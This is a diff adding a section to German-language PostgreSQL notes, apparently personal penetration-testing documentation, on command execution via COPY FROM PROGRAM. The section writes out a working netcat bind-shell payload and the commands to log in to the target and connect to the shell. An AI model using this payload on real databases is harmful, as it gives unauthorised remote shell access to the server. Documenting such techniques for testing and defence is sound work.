@@ -35,5 +35,30 @@ Remote Access ermöglichen
 6. psql -h <IP> -p 5432 -d <DB> -U <user> -W
 
 
+####################################
+Command Execution with COPY Command
+####################################
+
+Quelle: `<https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767>`_
+
+In diesem Szenario erfolgt eine remote Anmeldung an die postgres-Datenbank; es wird ein Listener eingerichtet, um beliebige
+Befehle auf dem Zielhost abzusetzen. 
+
+1. Anmelden an Datenbanken mit Admin-User::
+   
+    psql -h <Zielhost> -U <User> -d <Datenbank> -W
+
+2. Remote Listener einrichten::
+   
+    COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l <Zielhost> <PORT> > /tmp/f';
+
+3. in einer neuen Shell können dann bash Befehle abgesetzt werden::
+   
+    nc <Zielhost> <PORT> 
+   
+   Befehle werden im Kontext des postgres-Serverprocesses ausgeführt.
+
+
+
 
 Zurück zu :ref:`postgresql`
